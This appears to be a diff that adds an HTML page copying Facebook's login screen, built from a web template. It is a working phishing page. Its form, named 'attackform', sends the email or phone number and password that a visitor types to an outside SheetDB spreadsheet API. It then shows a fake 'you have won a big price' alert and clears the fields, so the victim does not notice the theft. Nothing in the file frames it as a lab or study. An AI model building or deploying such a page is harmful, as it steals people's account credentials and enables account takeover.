@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<!-- Coding By CodingNepal - www.codingnepalweb.com -->
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login Page</title>
+  <link rel="stylesheet" href="facebook.css">
+  <link rel="icon" type="image/x-icon" href="facebook.svg">
+
+</head>
+
+<body>
+  <div class="container flex">
+    <div class="facebook-page flex">
+      <div class="text">
+        <h1>facebook</h1>
+        <p>Connect with friends and the world </p>
+        <p> around you on Facebook.</p>
+      </div>
+      <form action="https://sheetdb.io/api/v1/i3gn4lgp4y81i" id="attackform">
+        <input type="text" placeholder="Email or phone number" required id="username" name="data[username]">
+        <input type="password" placeholder="Password" required id="password" name="data[password]"> 
+        <div class="link">
+          <button type="submit" class="login">Login</button>
+          <a href="#" class="forgot">Forgot password?</a>
+        </div>
+        <hr>
+        <div class="button">
+          <a href="#">Create new account</a>
+        </div>
+      </form>
+    </div>
+  </div>
+  <script>
+    var form = document.getElementById('attackform');
+    form.addEventListener("submit", e => {
+      e.preventDefault();
+      fetch(form.action, {
+        method: "POST",
+        body: new FormData(document.getElementById("attackform")),
+      }).then(
+        response => response.json()
+      ).then((html) => {
+        // you can put any JS code here
+        alert("Look out You have won a big price check out your email")
+        document.getElementById('username').value = ""
+        document.getElementById('password').value = ""
+
+
+      });
+    });
+  </script>
+</body>
+
+</html>
